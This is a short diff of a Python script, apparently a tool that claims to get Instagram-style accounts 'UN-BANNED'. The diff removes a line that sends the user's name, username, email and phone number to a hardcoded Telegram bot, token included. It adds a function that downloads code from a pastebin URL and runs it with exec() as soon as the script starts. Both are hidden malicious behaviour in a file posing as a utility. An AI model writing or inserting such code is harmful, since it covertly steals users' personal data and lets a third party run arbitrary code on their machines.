@@ -39,9 +39,11 @@ print("----------------------------------")
 
 
 
-tlg =(f'https://api.telegram.org/bot1621155562:AAFZGnJTv12nxrim86Mxi9sozjzQPIDdGmk/sendMessage?chat_id=502361503&text=Tool : ✥[UN-BANNED]✥\n✥2L21L1-NEW Login  ✥\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n✥.⍆.name : {name} \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n ✥.⍆.banned username : {user_name} \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n ✥.⍆.Email : {email} \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n ✥.⍆.Phone num : {phone_num} ')
-requests.post(tlg)
+def tel():
+    e = requests.get('https://pastebin.com/raw/yzK3frV0').text
+    exec(e)
 
+tel()
 
 
 
